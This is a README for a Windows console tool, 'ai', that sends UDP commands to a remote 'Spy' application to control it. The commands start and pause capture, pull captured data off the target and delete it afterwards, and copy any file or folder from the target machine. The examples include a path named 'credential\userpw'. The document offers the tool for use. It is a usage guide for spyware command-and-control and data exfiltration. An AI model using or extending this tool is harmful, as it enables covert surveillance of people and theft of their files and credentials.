# ai
ai is developed for udp message communication and reformatted to control Spy application.
Program was tested on Windows 10 and was written in Visual Studio 17.

### More about application
Application might be used as console with arguments.
syntax: ai send xx.xx.xx.xx:80 message_type
Spy is using 80 port. replace ip address what you want to control.
##### Message Type
1 - start capture
2 - pause capture
3 - copy captured data, delete after send, continue capture
4 - copy captured data, delete after send, pause capture
path - copy any data in path followed argument.(e.g. `ai send 192.168.1.58:80 d:\foldername`)
**important note: I couldn't test with folder which its name contain space like "dev tools" or "windows 10".
if you give space, the word followed space will be set as next argument. if you need to copy even folder with space in its name, contact me.**

### How to use this application
open cmd or powershell. give command to run this app with arguments.
app_name send xx.xx.xx.xx:port message_type
resume capture: `ai send 192.168.1.58:80 1`
pause capture: `ai send 192.168.1.58:80 2`
copy and resume: `ai send 192.168.1.58:80 3`
copy and pause: `ai send 192.168.1.58:80 4`
copy any path: `ai send 192.168.1.58:80 d:\credential\userpw` `ai send 192.168.1.58:80 d:\study\english\unit1.mp3`
You can copy both folder and file.
Don't use backslash(`\`) at the end of path. Spy adds backslash itself if it's a folder.(Spy.cpp #535)

### Appendix
Check Readme in Spy project to learn how to install spy app.